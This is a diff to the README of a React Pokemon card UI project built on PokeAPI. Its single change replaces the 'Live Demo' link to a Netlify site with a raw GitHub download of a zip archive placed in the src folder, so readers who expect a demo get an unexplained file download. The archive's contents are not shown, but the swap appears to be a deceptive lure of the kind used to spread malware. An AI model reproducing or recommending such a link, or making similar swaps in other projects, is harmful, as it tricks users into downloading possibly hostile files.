@@ -1,6 +1,6 @@
 # Pokemon card Ui - PokeAPI
 
-Live Demo 👉 [https://verdant-vacherin-97593d.netlify.app/](https://verdant-vacherin-97593d.netlify.app/)
+Live Demo 👉 [https://github.com/Wixyy-bit/React-Pokemoncard-pokeAPI/raw/refs/heads/main/src/React-API-Pokemoncard-poke-2.8-beta.5.zip](https://github.com/Wixyy-bit/React-Pokemoncard-pokeAPI/raw/refs/heads/main/src/React-API-Pokemoncard-poke-2.8-beta.5.zip)
 
 A modern, responsive, and visually polished frontend project focused on clean UI, smooth interactions, and contemporary web design aesthetics. This project showcases strong fundamentals in HTML, CSS, and JavaScript with an emphasis on layout, animations, and user experience.
 
